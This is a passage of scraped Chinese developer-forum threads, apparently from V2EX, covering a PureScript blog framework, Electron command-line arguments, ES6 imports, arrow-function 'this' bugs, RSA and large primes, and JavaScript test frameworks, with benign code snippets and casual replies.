class=\"n\">main</span>\n</pre></div>\n\n<h3>4.现在博客的功能基本完善。讲一下框架之上博客的功能：</h3>\n\n<ol>\n<li>文章的增删改，搜索功能还没做，感觉没什么必要做。在下一条讲</li>\n<li>不限制层次的分类。对的，分类就是树状递归结构，不限制层数。你爱几层就几层，跟文件系统的目录类似。用这样的分类来整理文章，我觉得根本没必要搜索了吧。而且我这一辈子能写一千篇高质量的博客不？</li>\n<li>页面缓存。因为 ORM 设计的问题和分类目录递归查询量很大，所以我干脆就直接给他们做了一个 10 分钟的页面缓存。登录成功的用户忽略缓存。成功发布或者修改 文章和分类 会简单全部刷新缓存。</li>\n</ol>\n\n<h3>5.关于前端</h3>\n\n<p>前端方面我准备使用 PureCSS 来做基本的 CSS 框架，然后做一个简洁好看的 UI 。 /w\\ 没错，本宝宝就是那么纯（ Pure ） 。 JavaScript 部分依旧还是用 PureScript 来做。当然 PureScript 写前端也有些蛋疼，不过我能折腾 /w\\。</p>\n\n<p>啊~ 终于能够好好写东西并且实验奇怪小东西的地方啊啦~</p>\n\n<p>》》<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bramblex/loveaira.me\">Github 传送门</a><br>\n》》<a target=\"_blank\" rel=\"nofollow\" href=\"http://lovearia.me/\">LoveAria.Me 博客主站</a></p>\n</div></div>"], "reply": "55", "tittle": "手撸了一个简单 web 框架，拿来做博客", "comment": ["估计也没几个人能看懂，太小众的东西哎。 ╮(╯▽╰)╭", "说句心里话，不喜欢框架，要造轮子就造个工具吧，框架这种东西限制太多，用起来束手束脚。", " \r", "\r", "要看您喜欢什么工具咯~", "说实话，不是看不懂，是不敢回，呵呵呵。", "表示小白完全不懂。。。", "看不懂,好厉害的样子( ⊙o⊙?)不懂", " \r", "\r", "语言太小众了……\r", "几乎都没人听过……\r", "只在 Haskell 圈里面小范围有人知道", " \r", "\r", "语言这东西又不重要。一般的代码要说写可能写不出，看不懂的还是比较少的。\r", "\r", "更何况还是博客这种烂大街的系统。\r", "\r", "首先作为一个框架来说，没有 test 基本属于不可饶恕的。\r", "\r", "其次缓存明显不该强制……\r", "\r", "然后 role 字段放在 user Model 里我个人不是很认同。\r", "\r", "大概看了一圈代码，大概是这些问题吧。", " \r", "\r", "还有\r", "\r", "getHomePage = findArticleById 0\r", "\r", "这个也太脏了吧？\r", "\r", "至少放在 config 里吧……\r", "\r", "或者是我理解错了？", " \r", "\r", "您说这些问题确实存在：\r", "\r", "1. 因为自用，所以根本没写 test 。不过 test 可以用 purescript 项目的 test ……虽然麻烦点。\r", "2. 缓存问题吗……我自己强制的，还是因为自用，没考虑给别人用。\r", "3. role 字段放在 userModel 里面是不应该的，然而……我这里 role 字段根本没起过作用，只是放在里面看的。\r", "4. home page 和 一般文章有什么区别吗？ /w\\ 既然没有，那我就直接扔给 aritcle 处理了，一切以方便出发~", "写了框架居然不发红包？", "  玛德智障", "你用纯函数式语言撸这种框架真是蛋疼。。。刚在群里看到。。", " 对啊……真是蛋疼……不过终于能用了", "特地去搜了一下 PureScript ，看来是 Python style 。", " 是函数式吧，老实说，真是继承了函数式语言的最大特性——完全没有阅读性", " \r", "\r", "不能因为看不懂就说没有阅读性啊……", " \r", "\r", "Python sytle 是什么鬼…\r", "\r", "应该说 Haskell sytle ， python 是抄 haskell 的，而且还抄得很烂。", " \r", "\r", "我写得不好看只是单纯因为我写得烂而已……", "曾经写过一阵子 haskell ，语言写起来实在麻烦", " \r", "\r", "写起来很爽啊，就是处理这种不知道具体类型的东西要蛋疼一些。不过其实也是可以很简单解决的。比如 Template Haskell ，或者自己造一个语言来生成 Haskell 代码。这些都是很简单的解决方案", "楼主你是 C 写多了还是 C 写多了还是 C 写多了下划线是什么鬼？？？？？", "好像在知乎看到过 OP 安利 PureScript ……过几年 WebAssembly 普及，只要 GHC 有 LLVM 后端就能直接拿 Haskell 写啦。", "Lib.Utils 是什么鬼东西啊，我虽然不用 PureScript 但是这些东西拿出来专门实现一遍也太鬼畜了吧？\r", "\r", "还有为什么 .js 和 .purs 放在同一个目录下，不是有 pulp 吗？", " GHC 本来就有 LLVM 后端， GHCJS 也早就理论上可以用了，但是生成文件的体积惨不忍睹", " \r", "\r", "是这样的，我自己曾经的语言风格是： \r", "类——首字母大写驼峰，\r", "函数 /方法——首字母小写驼峰\r", "变量——首字母小写下划线\r", "\r", "放在这里面好像不对劲……", "然后楼主打算 type Sql = String 吗？你这是写 Python/NodeJS 呢……", " \r", "\r", "那就等普及吧~\r", "不过即便普及，我觉得 JavaScript 还能作为 target 语言活着。毕竟，你见过范式那么全的大杂烩吗？ /w\\", "哦，楼上我好像看错了，无视我对 Sql 的吐槽，我来研究一下 Model", " \r", "\r", "purescript pures/ js 放在同一目录有问题？我不知道， purescript 的作者就是这样写的。我跟着他做的", " 入乡随俗，变量名请统一使用希腊字母，\r", "\r", "cata phi = In . fmap (cata phi) . out\r", "\r", "其它的统一驼峰法咯（逃", " \r", "\r", "炫技 / 练手 。至于有没有？\r", "\r", "当然是没什么卵用啊 ！", " 我又傻逼了，我看成了你生成的 JS ……我就想怎么会犯这么低级的错误。 PureScript 的包我一点都不熟悉还是不看了，我们聊聊为什么不用 Haskell 吧？", " \r", "\r", "/w\\ 还真可以……\r", "\r", "```Haskell\r", "搞 = id\r", "比利 = id\r", "(♂) = id\r", "\r", "搞 ♂ 比利\r", "```", " 来点严肃的吐槽，既然是炫技，你 SQL 还要手工定义 Schema 是不是太麻烦了？我记得最近 PureScript 似乎是支持 Generics 了——虽然 Template PureScript 还是坑，希望今年 GSoC 能加进去——搞个什么根据数据类型自动生成 SQL 操作代码岂不美哉？", " 因为我的 vps 装不进 ghc 。并且我不想折腾交叉编译", " 今年的 GSoc 还真有 Template PureScript 项目……", " 因为只见过 Python", " \r", "\r", "我想想怎么实现", " 好像用不上， PureScript 的 record syntax 比较神奇我不是很熟悉，但看你用得好开心啊。\r", "\r", "GHC 装不进 VPS 是嘛，这个确实是比较严肃的问题，我前段时间真是日了狗了 pandoc 编译 VPS 上死活不成功，结果查了一下 aeson 出了问题，那个版本需要 7GB RAM 才能编译，但是我所有的 Mac 都有这么多内存一点问题都没有……\r", "\r", "对啊对啊，你要不要试试， 5500 刀呢。", "膜，楼主不是 haskell 大法好嘛", "大神(´ﾟДﾟ`)", " \r", "\r", "我那个 vps 一年 99 RMB ，你指望我能装上 ghc 吗？连硬盘都只有 3G ，装个系统就差不多了，哪里有地方给我装 ghc 嘛 TnT", " 这个跟 Haskell 长得差不多", " 活捉~", "下一步就是整合 elm 来写前端了么？", " 正在用 purescript 写前端中 虽然麻烦", "另外，写后端直接用 Haskell 不好吗……", " 我的 vps 只有 3G 硬盘…… ghc 装都装不上。而且我不想折腾交叉编译", " 我还觉得 js 和 scheme 差不多，真的", " 你们不去贴吧了么。。", " \r", "我也学过 haskell ，也看过类似 yesod 之类的 web 框架，但在 vps 上面 build 的时候直接报内存不足了。\r", "不知道在服务器上跑 haskell 的东东最起码要多少内存？", " \r", "\r", "我没有具体了解要多少。据说 8G 够用……", "打不开呀", " 哎，一直都好好的啊？可能是你打开的时候刚好遇到我在升级"]},
{"content": ["<div class=\"topic_content\">在 nodejs 里面 process.argv 就能轻松拿到，但是在 electron 里面却不是这样,得到是这些鬼东西\r<br>0: \"/xxx/Contents/MacOS/Electron Helper\"\r<br>1: \"--type=renderer\"\r<br>2: \"--no-sandbox\"\r<br>3: \"--lang=zh-CN\"\r<br>4: \"--node-integration=true\"\r<br>5: \"--num-raster-threads=2\"\r<br>6: \"--enable-zero-copy\"\r<br>7: \"--content-image-texture-target=3553,3553,3553,3553,3553,34037,3553,3553,3553,34037,3553,34037,34037\"\r<br>8: \"--video-image-texture-target=34037\"\r<br>9: \"--channel=92694.1.1223733385\"\r<br>\r<br>查了半天也没找到答案 QAQ</div>", "<div class=\"topic_content\">实际情况是我想用 electron 做个 app\r<br>有一个功能就是当拖动一个文件到这个 app 上面，就会启动这个 app ，同时要得到这个文件的路径\r<br>相当于我在命令行里用\r<br>open -a MPlayerX.app xxx.mp4\r<br>就能用 MPlayerX 播放这个 MP4 文件\r<br>\r<br>我的需求就是无论是拖动文件的方式还是命令行的方式，我都要得到那个文件的路径\r<br>啃食 process.argv 里面就是没有啊</div>"], "reply": "6", "tittle": "用 electron 如何得到命令行参数", "comment": ["[", " ", ")\r", "\r", "```\r", "//app was wrapped by electron.exe, so slice the first argument(electron.exe's path)\r", "var argv = require('yargs').parse(process.argv.slice(1));\r", "\r", "var date = argv.date;\r", "//....\r", "```", " \r", " \r", "不都是读 process.argv 吗，但是没用啊", " electron 本身就是对 node 的一层 wrapper ，所以直接读 process.argv 有问题\r", "\r", "话说我不是回答你该怎么做了么？你到底在纠结什么", " 有点忙，没空研究这个\r", "你是没懂我的意思啊， process.argv 里面压根就没有我想要的数据啊", " 找到了，原来是监听 open-file 事件"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以前的代码，最近整理了一下。</p>\n<p>无任何依赖，兼容绝大部分浏览器包括 IE6 ，很适合简单的活动页使用。 tooltip 显示时会自动调整出现位置以保证自身始终处于浏览器视口范围内。</p>\n<p><a href=\"https://github.com/zhiyul/ZTooltip\">github</a></p>\n<p><a href=\"http://weatherstar.me/ZTooltip/\">demo</a></p>\n<p>觉得不错就给个✨吧（好吧，其实我是来骗星的）</p>\n</div></div>"], "reply": "7", "tittle": "一个原生、轻量、自适应位置的 tooltip 插件，适合没有依赖的简单页面使用", "comment": ["欢迎各种意见建议 n(*≧▽≦*)n", "✨支持一下，开源万岁，楼主最高， Tooltip 天下无敌。", " 感谢，言重了 😂", "支持一下，楼主可以写个响应式的 demo ，默认 2000px 的宽度太长了。", "我希望能 Copy tooltip 上面的内容，像这样： ", " @", " 感谢，已列入改进计划。", "纯纯的 css  tip  ", " 给你灵感  😄"]},
{"content": ["<div class=\"topic_content\">观战地址：。这里发不到图 \r<br>\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/drduan/minggeJS/issues/222\" rel=\"nofollow\">https://github.com/drduan/minggeJS/issues/222</a></div>"], "reply": "2", "tittle": "MinggeJS1.95 PK JQ2.x, 有图有真相，绝对震憾！快来，超级精彩", "comment": ["人呢？？？？？？？？？？？？？//", "明哥好，明哥是不是就是那个对 jq 底层了如指掌的明哥？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>ES6</h2>\n\n<p>import xxx from './xxx'<br>\n这样的话，得先知道模块里有啥。<br>\n或者得先输入模块名，感觉略麻烦。</p>\n\n<h2>Python</h2>\n\n<p>from xxx import xxx</p>\n\n<p>感觉 Python 的写法更有利于 IDE 的自动补全。引用一些模块时，写起来也方便。</p>\n</div></div>"], "reply": "11", "tittle": "ES6 中， import 的写法貌似不利于编辑器的自动补全？", "comment": ["IDE 可以帮你往左挪光标嘛", "或者列出全部模块帮你补全 from ？", "知道模块名不是天经地义的么…\r", "\r", "你是不是还希望无歧义的时候完全不写模块名呀…\r", "\r", "这么一说，我可以在重构自己的语言的时候加上这种特性", "是有点", "import *不就好了", " 楼主的意思好像是先输入 import *（* 是某模块内的），由于不知道从哪个模块导入，不利于自动补全。", "也不一定， ES6 的逻辑是…模块名是你肯定知道的，这样的话 IDE 可以帮你补全目录…", "export function 这种， 引入的时候函数名可以随便定，每次都要翻来翻去看写错了没", "实际上吧，现在的 js ide 都是全代码扫描，即便是 webstrom 这么牛 b 的 ide 也只是优先找可能是模块里的\r", "比如我写个$(xxx).w 那肯定要提示 width 因为 jquery 基本成了基本库了 即便是当前模块里没扫到 jquery 的引用也要按照 jquey 提示", "没错， es 的语法设计甚少考虑 ide 是个事实，也许那帮家伙都是非 ide 党", "确实如此, 2 种都支持就好了, 这个顺序其实不产生歧义。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><em>QQ 邮箱里面打开一个 URL 链接</em>\n<img alt=\"QQ 邮箱图片 1\" src=\"http://i12.tietuku.cn/8d562ab0cb93a03a.jpg\">\n在跳转到目标 URL 之前,会有一个拦截的提示\n<img alt=\"QQ 邮箱链接 2\" src=\"http://i12.tietuku.cn/506df2450b52a4f4.jpg\">\n<em>V 友们帮忙看看,这个功能怎么做出来的?</em></p>\n</div></div>"], "reply": "10", "tittle": "这个功能是怎么做出来的?", "comment": ["判断域名", "用 js 把所有的链接都拦截下来，如果域名不是自己的，就跳到跳转页，是自己的就放行", "js 的阻止事件\r", " \r", " \r", " 你们有没有做过类似的功能", "仔细看代码 所有的 a 的 click 都被绑了事件\r", "\r", "然后代码里有一段 if(isLinkNeedSwap(g))\r", "{\r", "g.target=\"_blank\";\r", "g.onclick=function(h){\r", "var i=_openExtLink(this,b,d);\r", "!i&&preventDefault(h||(a&&a.event));\r", "return i;\r", "};\r", "}\r", "剩下的不用多说了", " 写过这个功能，没用上。\r", "可以交给 js 在前端完成，最好配合后台一个 redirect 的接口完成。", "配合后台 redirect ，方便统计和设置黑名单这些。", "之前我做的一个邮件验证功能就腾讯拦了一下，然后把地址给我转义了，跳进去就 500 ，妈蛋", " 好主意 \r", " 只用 JS 完成的吗?", " 这东西就几行 js 代码，楼主你究竟有没有自己尝试…"]},
{"content": ["<div class=\"topic_content\">这是看到最近的某帖子的疑问。\r<br>经常看到素数与密码有关，但是不是很懂为什么素数与密码有这么深的关系，而且我也只知道现代的密码是通过分解大素数实现的，至于为什么要用大素数，也不是很懂。</div>"], "reply": "23", "tittle": "为什么密码必须要用到大素数", "comment": ["RSA 的实现，阮一峰有篇拾人牙慧的，还不错", "RSA 算法基于一个十分简单的数论事实:将两个大素数相乘十分容易·但是想分解它们的乘积却极端困难,因此可以将乘积公开作为加密密钥", "将所有不太大的素数都乘一遍不就行了？", "一个问题的逆问题是难问题。\r", "大数可能的解空间会非常大，素数是因为素数本身的性质。", " n 方", "简而言之：\r", "问：“你说你的加密算法安全， 凭什么？”， 答：“基于数学的 xxx 不可解问题”", "因为对于大数的因数分解在目前是困难的\r", "这一现状可能会在数论有相关重大突破后改善", " 本来想类比一下的，还是直接丢一个 wiki 吧 ", "其实很多密码系统用的不是数论而是代数。\r", "不过非对称性加密似乎确实都是数论。", "也不一定，椭圆曲线加密就跟素数没啥关系。", "答案在 @", " 给出的链接的第二部分\r", "\r", "搜索“那么，有无可能在已知 n 和 e 的情况下，推导出 d ”", "据说有数学协会给能破解 RSA 的人设了个 100 万美元的奖\r", "然而假如真能破解，可以赚的钱比 100 万不知道高到哪里去了", "因为“ 2 个素数相乘容易，分解回 2 个素数不容易”", "因为基于大素数分解是数学上的一个复杂问题,既然数学家都不能很好解决,那么正好就用在加密上呗", "单向陷门函数", "又学到了。。。", " 本来以为是什么科普知识还想读一下的，打开看了一眼还是决定关掉搬砖去了。", "瞬间觉得自己遇到硬伤了。自己写的只不过过过家代码。", "“将两个大素数相乘十分容易·但是想分解它们的乘积却极端困难”\r", "\r", "本质上是让解出密码的成本大于获取到的信息的价值。比如一个 RSA 可能数百年解开。到时候秘密也不是秘密了。", " 曲线是定义在 Z_p 域上的，明显用了大素数", "没别的就是特别难算，如果你找到别的类似的正向计算容易 /逆向困难的问题也可以拿来做加密的基础。", " 孤陋寡闻了，感谢指出"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在我有一个变量 <code>flag</code>，由这个变量来决定最终会得到哪个函数，目前我是这样写的：</p>\n<pre><code>\nvar flag = false;\n\n// 我需的要函数\nvar myFn = createFn(flag);\n\nfunction createFn(flag){\n  var partFn;\n\n  if(flag){\n\n    partFn = function(){\n      //第一种情况...\n    }\n\n  }else{\n\n    partFn = function(){\n      //第二种情况...\n    }\n    \n  }\n\n  return function(){\n    //...\n    \n    setTimeout(partFn, 0);\n\n    //...\n  }\n\n}\n\n</code></pre>\n<p>我感觉这种写法不太好，是否有可以改进的地方？</p>\n</div></div>"], "reply": "9", "tittle": "用一个函数返回两种不同的函数，怎么实现？", "comment": ["直接 retuen funtion(){...}", "用 return 连 else 都可以省了。", "再改的话，就是用动态特性，比如拼函数名什么的来确定具体要调用的函数。", "var fn1 = function(){};\r", "var fn2 = function(){};\r", "var myFn = flag?fn1:fn2;", " 你这个写法跟我同事的想法一样，你没注意到我的 partFn 外层还有一大堆代码呢", "同楼上，直接 return partFn ，没明白加了一堆其他的还有 setTimeout 是干嘛……", " 因为 partFn 里面引用了外层代码里面的变量，我需要的函数也不是 partFn ，它只是我的函数中的一个子函数而已", " 本来我是没太明白你的需求的，也不怎么用 javascript ，但看了回复反而好奇了...\r", "\r", "partFn 如何引用了外层代码的变量了？外层代码是指 return function() {... 里注释的那些？\r", "就我所知， javascript 的词法作用域是和函数表达式所在位置相关， return function() {... 中通过 setTimeout 调用 partFn 没法引用外层代码的吧！？如果你是指更外层，也就是 createFn 中的变量，那像楼上诸位说的直接返回也是没关系的吧。\r", "\r", "最后，我想说的是，其实函数也是可以作为函数参数传入的，或者说，你的 createFn 做的事太多了...", " 感谢回复，确实是我的思路有问题，这段代码我已经放弃了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://zhuanlan.zhihu.com/ibuick/20671763\" rel=\"nofollow\">http://zhuanlan.zhihu.com/ibuick/20671763</a></p>\n</div></div>"], "reply": "1", "tittle": "[特辑] Azer NPM 撤包事件全信件中文翻译（我翻的）", "comment": ["沙发"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3><a href=\"http://handsomeone.github.io/JavaScript24/\" rel=\"nofollow\">##戳这里戳这里##</a></h3>\n<ul>\n<li>\n<p>用 JavaScript 语法来算 24 ，拿来练动画的一个项目</p>\n</li>\n<li>\n<p>本来想禁止使用括号的，然而觉得这样严重依赖运算优先级（过于 tricky ），所以其实它的难度是低于传统的算 24 的</p>\n</li>\n<li>\n<p>欢迎各种批评或建议</p>\n</li>\n</ul>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>链接非常不明显吗😂</p>\n<p>我注意到这个主题有116次点击 然而github上的uv仅有7个</p>\n<h1><a href=\"http://handsomeone.github.io/JavaScript24/\" rel=\"nofollow\">点我开玩</a></h1>\n</div></div>"], "reply": "2", "tittle": "同学们，来算 24 吧😁", "comment": ["为什么 14 点会有 0 而且我出了两个 0", " for fun 嘛… 0 可以组成 8 进制或者 16 进制头部"]},
{"content": ["<div class=\"topic_content\">看到网上很多插件，但是我们找的外包公司说没有一个是可行的。\r<br>\r<br>请靠谱的在 Phonegap 里上传文件到 dropbox 的办法\r<br>\r<br>\r<br>\r<br>谢谢大家</div>"], "reply": "1", "tittle": "Phonegap 备份一个 jason 文件到 dropbox 可行吗？", "comment": ["应该是可行的，通过 js 发送 http 请求到 dropbox 的 API 。相关文档 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>function Keygrip(keys) {\n  if (arguments.length &gt; 1) {\n    console.warn('as of v2, keygrip() only accepts a single argument.')\n    console.warn('set keygrip().hash= instead.')\n    console.warn('keygrip() also now only supports buffers.')\n  }\n\n  if (!Array.isArray(keys) || !keys.length) throw new Error(\"Keys must be provided.\")\n  if (!(this instanceof Keygrip)) return new Keygrip(keys)\n\n  this.keys = keys\n}\n\n\n Keygrip.prototype = {\n  _hash: 'sha256',\n}\n\n\nObject.defineProperties(Keygrip.prototype, {\n  // modified Keygrip.prototype.constructor's enumerable = false\n  constructor: {\n    value: Keygrip,\n    writable: true,\n    configurable: true\n  },\n  \n  hash: {\n    get: () =&gt; {\n      console.log(this);  // {} 空对象\n      return this._hash;  // undefined\n    },\n    set: (val) =&gt; {\n      if (!util.supportedHash(val)) throw new Error('unsupported hash algorithm: ' + val);\n      this._hash = val;   \n    }\n  },\n \n});\n\n&gt;&gt;&gt; const KeyGrip = require('keygrip');\n&gt;&gt;&gt; var s = KeyGrip(['fuck off my house', 'I never want to see you again']);\n&gt;&gt;&gt; console.log(s.hash)\n{}\nundefined\n</code></pre>\n<p>这是<a href=\"https://github.com/crypto-utils/keygrip/blob/master/index.js\">keygrip</a>模块，我看到它原本的 constructor 只是定义了 value ，是可枚举的。手贱 fork 后修改了下，发现 get 和 set 中的 this 都是指向了一个空对象{}，所以这样写的话，无论获取还是设置，都没有成功，想不明白到底是为什么。</p>\n</div></div>", "<div class=\"topic_content\">关于这个问题，随便找个教程看箭头函数对作用域的改变吧，是我在玩箭头函数之前没有去看教程 <a target=\"_blank\" href=\"http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001438565969057627e5435793645b7acaee3b6869d1374000\" rel=\"nofollow\">http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001438565969057627e5435793645b7acaee3b6869d1374000</a></div>"], "reply": "9", "tittle": "js 定义属性奇怪的问题。", "comment": ["我擦，吓到宝宝了，居然有代码加色", "目测是 箭头函数的坑，\r", "解决方法是：不用箭头函数", " 我去我一着急，就一路用箭头装逼下去，现在一换过来，果然，这个坑搞得我测试了很长时间，一路以为是作用域的问题", "  es6 增加了 let,  => 特性后我发现之前的作用域， this 指向 问题又复杂了，泪。", "你这箭头函数用错了。\r", "\r", "```javascript\r", "  hash: {\r", "    get()  {\r", "      console.log(this);  // {} 空对象\r", "      return this._hash;  // undefined\r", "    },\r", "    set(val)  {\r", "      if (!util.supportedHash(val)) throw new Error('unsupported hash algorithm: ' + val);\r", "      this._hash = val;   \r", "    }\r", "  },\r", "```", "arrow function 的 this 是来自外部域的，你调用 xxx.hash = yyy 的时候，是调用了 set 函数，但是 set 箭头函数中的 this 并不指向 xxx ，而是指向 xxx.hash = yyy 这个语句所在域的 this 。我估计这个域是个最外层域，所以 this 就变成了 undefined ， get 同理。这是我的推断不知道对不对。", " 是的，我用 arraw 的时候没有去看 es6 ，以为和普通的匿名函数是一样的，后来才知道 es6 的 arraw 的作用域只会是调用方法的对象，而没有运行时这个坑，之所以只在 arraw 规则这样实现，我认为是为了做到向后兼容吧，普通的函数 this 运行时依旧不改变。", " “之所以……” function 里的 this 本来就是语言的特性之一，谈不上什么向后兼容。", "keygrip 这个模块看不懂有什么用，\r", "\r", "只是做一个 hash 加密的话，为何参数要设置成数组，直接指定一个字符串作为秘钥不就行了。\r", "\r", "不明白。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想知道 V2EX 如何实现 PC 、移动端网页的适配。是写了两套代码，还以用了媒体查询？</p>\n</div></div>"], "reply": "8", "tittle": "v2ex 如何实现 PC、移动端网页的适配", "comment": ["两套。", "移动端只有非官方的，估计是找不到投资方没有经费开发？", "两套，服务端判断当前浏览用户 browser 是否是移动端，如果是则使用移动端页面", " 难道非官方移动端是作者拉到投资开发出来的？", "这个移动端非常不一致，我是很久很久很久以后才学会怎么在手机上发新帖", "我现在就是移动客户端回复的", "网页适配和简单 \r", "两套模版\r", "USGER 适配", "......难道不是 html5 响应式吗....."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我在做一个 js 小游戏，就是两条移动的点组成的的两条线段，随着点的移动，线条会越来越长，请问一下改如何判断两条线段会碰撞呢。</p>\n<p>我自己想到的是，为了让计算简单，我控制点只能上下左右移动，将地图分成若干个小方块，点始终在方块的中心，每移动一下就是占领一个小方块，依据小方块的熟悉来计算是否碰撞。</p>\n<p><img alt=\"Alt text\" src=\"http://ac-qvftzptz.clouddn.com/c4c154969295d14b988d.jpg\"></p>\n<p>不知道是否有更好的计算方式，或者是，关于曲线运动的算法呢。</p>\n</div></div>"], "reply": "13", "tittle": "关于 js 碰撞检测坐标的计算", "comment": ["没看懂你说的什么意思。\r", "具体的碰撞检测，你可以在一个 JSON 里面，给每个方块一个编号，值为 0 的时候，为空，为 1 的时候是第一条线占领了，为 2 的时候，是第二条线占领了。\r", "每次运动完毕之后或者运动之前根据已有值进行判断。\r", "具体是以前还是之后，就看你的需求了。", "这么简单是因为你的线每次都占一个格子，如果不是一个格子，是一个圆，就又稍微麻烦点。", " 我的意思就是这样，因为我是只能想到这样的计算方法，所以才让线每次占一个格子，我想知道线如果就是正常运动呢，或者是曲线的运动，该如何计算呢", "。。。。发现我打错字了，是‘属性’，不是熟悉。。。。", "有点像贪吃蛇，但又不太一样。\r", "先描述一个通用方法，但不一定是最优的：\r", "先对线段做个轮廓，首先运动以 1x 坐标系，下来是计算要以 4x 坐标系。\r", "1 、快速边界排除，以 2 个轮廓的四条边做比较，可以快速排除完全不想交的情况。\r", "2 、快速排除为假后，考虑这个还可能不是凸多边形，那么做 xy2 个方向的投影，然后判断重叠区间，没有重叠自然不相交，如果有重叠，对 2 个图形上的重叠坐标部分做另外一个方向的投影，找重叠区间，证明是否的确相交。", "写小游戏用框架，一个触碰事件就搞定了。", "这不就是从两点求直线方程，然后判断直线斜率是否相等么？", " 又看了看， LZ 你应该把 “两条线段” 改成 “两条轨迹”。线段指的是直线。\r", "1 楼的办法很标准，就是弄个数组把走过的点标记上就行了。", "额……数组……\r", "其实不懂，看了一楼的解释后，想到了个办法。就是先初始化两个数组，数组中分别存放一份相同的存储地图的坐标信息。然后给两根“线段”分别分配一个数组，线段每移动一次，就把对应坐标数组的相应下标赋值，然后两个数组求交集。如果有交集，那么就发生了重合。不知道说得对不对，菜鸟一枚，还请多多提点， O(∩_∩)O 谢谢", "想到有一个办法，每个 Object 都有一个数组表示它在屏幕中的位置，每一位代表一个点。有计算好当前位置后，对两个数组进行与操作，如果有不为 0 的就是相碰了", " \r", " \r", "我一开始有这么想过，但是实际操作的时候，为了。。。好看，我并不是每次走一格，利用了动画， 1 秒 60 帧，每帧动画，运动 1px 像素，这样轨迹运动更加流畅。然后我每隔固定的帧数，判断一下轨迹所在的格子。如果光靠坐标的数组交集来判断，精度可能会不准确，估计会有问题，而格子的话，我只需要判断一个大概的范围，就知道坐标位于哪一个格子的中心。", "you need this "]},
{"content": ["<div class=\"topic_content\">当然要分node和浏览器端.</div>"], "reply": "27", "tittle": "大家写 js 都用什么测试框架？", "comment": ["Node.js 端用 Jasmine ，浏览器端用 Jasmine+ Karma", "Node 用 ava\r", "浏览器 Karma + xxx", " \r", " \r", "\r", "果然 mocha 已经过时了吗...另外那个 ava 好像 tj 还推荐过", " 对啊，为何不用 mocha ？ jest 如何评价？（最近要开坑撸 node 服务端了", "mocha 挺好用的啊\r", "用 mocha + co-mocha + should + istanbul + ", " + coveralls.io 撸了几个 100% coverage 的小轮子。", "当然我说的是 node 这边。。。", "ava 是吐槽 mocha 的 test 不是并行执行的，很慢啥的。。。\r", "估计等我体会到了 mocha 的慢会换吧。暂时没体会到。", "mocha  嘛", "用 alert()的算什么", " 哈哈， console.log()", "人肉测试??!!", "难道只有我是 mocha + chai 吗", "mocha + chai. ava 现在不支持 React", " 可以 mock 支持 233", "mocha ， ava 这种单测库看了眼 dependencies 就不想用了，太笨重，尤其是用到 browser 里的时候。\r", "很多侵入式设计，各种全局变量，有洁癖的人完全无法忍受。\r", "\r", "于是自己撸了个超轻量的库： ", "\r", "\r", "\r", "# Features\r", "\r", "- Supports both Node.js and old browsers\r", "- Should work well from ES3 to ES7\r", "- Make it super easy to concurrently test async functions, designed for `async-await`\r", "- Automatically garbage collect the unhandled error\r", "- Full customizable report style\r", "- Not a single global variable pollution\r", "- Only one dependency, light weight and behavior predictable", "昨天刚有人向我推荐了摸插。", "r#16 是摩卡不是抹茶呀\r", " \r", "\r", "然而我用 jasmine", "gs.js", " 摩卡这名字一点儿不霸气，所以按拼音来读会污很多。", "console.log 好羞愧。", "说 alert console 都不知道什么是测试框架", "最近个人项目都选择了 Jest", " 不就是 ava 的轮子吗。。", "mocha", "摩卡和茶....", " ava 还没出名的时候写的，当时只有 mocha 和 tape 之类的库。而且现在来看感觉 ava 太繁杂了，我需要一个简洁的库，以防止类似 left-pad 这样的悲剧。依赖过多就很难保证程序的稳定性和可预测性。", "因为 React 用的是 Jest ，准备学来看看。\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>translater.js</h1>\n<p><a href=\"https://www.npmjs.com/package/translater.js\" rel=\"nofollow\"><img alt=\"\" src=\"https://jaywcjlove.github.io/sb/ico/npm.svg\"></a> <a href=\"#\" rel=\"nofollow\"><img alt=\"\" src=\"http://jaywcjlove.github.io/sb/ico/gulp-build-with.svg\"></a> <a href=\"#\" rel=\"nofollow\"><img alt=\"\" src=\"http://jaywcjlove.github.io/sb/status/no-dependencies.svg\"></a> <a href=\"#\" rel=\"nofollow\"><img alt=\"\" src=\"http://jaywcjlove.github.io/sb/status/stable.svg\"></a> <a href=\"#\" rel=\"nofollow\"><img alt=\"\" src=\"https://jaywcjlove.github.io/sb/license/mit.svg\"></a></p>\n<p>这是一个利用 HTML 注释的页面翻译解决方案。对于少量的静态页面，这种解决方案显得更简单。它没有依赖，压缩只有只有(~2kb)。</p>\n<p><img alt=\"\" src=\"https://segmentfault.com/img/bVtZ5f\"></p>\n<p><a href=\"https://jaywcjlove.github.io/translater.js/\" rel=\"nofollow\">Translater.js 官网</a></p>\n<ul>\n<li>支持 <code>IMG</code> <code>文本</code> 切换</li>\n<li>支持 URL 加载语言</li>\n<li>支持本地缓存选择</li>\n</ul>\n<h1>作为模块安装</h1>\n<pre><code>$ npm install translater.js\n</code></pre>\n<h1>传统使用方法</h1>\n<pre><code>&lt;div&gt;\n    这里是中文\n    &lt;!--{jp}ここは日本語です--&gt;\n    &lt;!--{en}Here is English--&gt;\n&lt;/div&gt;\n&lt;script src=\"../dist/translater.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\nvar tran = new Translater({\n    lang:\"jp\"\n});\n&lt;/script&gt;\n</code></pre>\n<p>切换语言方法通过超链接</p>\n<pre><code>&lt;a 